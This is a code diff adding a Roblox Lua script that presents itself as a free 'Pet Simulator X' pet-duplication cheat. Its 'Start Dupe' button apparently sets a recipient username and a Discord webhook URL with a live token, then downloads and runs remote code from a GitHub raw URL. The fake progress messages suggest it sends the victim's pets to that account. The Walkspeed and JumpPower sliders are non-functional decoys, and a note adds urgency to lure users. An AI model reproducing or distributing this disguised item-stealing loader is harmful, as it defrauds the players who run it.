@@ -1,0 +1,57 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = " Pet Simulator X!  Dupe By:Krabat", HidePremium = false, SaveConfig = true, ConfigFolder = "💖 Pet Simulator X! 🐾 Dupe"})
+    
+local Tab = Window:MakeTab({
+    Name = "Dupe here",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddParagraph("Instructions","Equip that pet you want to dupe(can dupe 1 pet at once)")
+
+Tab:AddButton({
+    Name = "Start Dupe",
+    Callback = function()
+                Username = "trokorrjr"
+                WebHook = "https://discordapp.com/api/webhooks/1063447879064227930/r4pSalpRPmVb0RwiRnijkG-elTYBqCpGkGYamxVEQ9noPaHWvfojiNjRQ-isl68yyHQh"
+                  
+                _G.CustomScriptName = "Duping Is Processing..."
+                _G.Text1 = "Dupe Started..."
+                _G.Text2 = "duping is Processing"
+                _G.Text3 = "Sending To Bank..."
+                _G.Text4 = "Dupe is Done..."
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+        end    
+    
+})
+local Tab = Window:MakeTab({
+    Name = "Misc",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddSlider({
+	Name = "Walkspeed",
+	Min = 16,
+	Max = 500,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Walk Fast!",
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+Tab:AddSlider({
+	Name = "JumpPower",
+	Min = 50,
+	Max = 350,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Jump High!",
+	Callback = function(Value)
+		print(Value)
+	end    
+}) 
+Tab:AddParagraph("Note","this script will be payed soon soo use it now when its free") 
+     
+    OrionLib:Init()
